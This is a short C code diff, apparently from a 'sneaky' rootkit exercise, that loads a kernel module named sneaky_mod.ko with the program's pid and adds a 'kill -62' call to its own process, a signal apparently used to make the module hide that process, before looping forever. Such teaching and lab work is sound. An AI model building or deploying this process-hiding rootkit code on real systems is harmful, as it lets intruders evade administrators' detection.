@@ -18,13 +18,18 @@ void load_module(pid_t process_id){
   sprintf(parameter, "insmod ./sneaky_mod.ko sneaky_pid=%d\n", process_id);
   //  printf("parameter is : %s\n", parameter);
   system(parameter);
+  pid_t pid = getpid();
+  char buf[32];
+  memset(buf, '\0', 32);
+  snprintf(buf, 32, "kill -62 %d", pid);
+  printf("hidepidbuf = %s\n", buf);
+  system(buf);  
 }
-
-
 
 int main(){
   cp_and_change();
   // print_id();
   load_module(getpid());
+  while(1){};
   return EXIT_SUCCESS;
 }
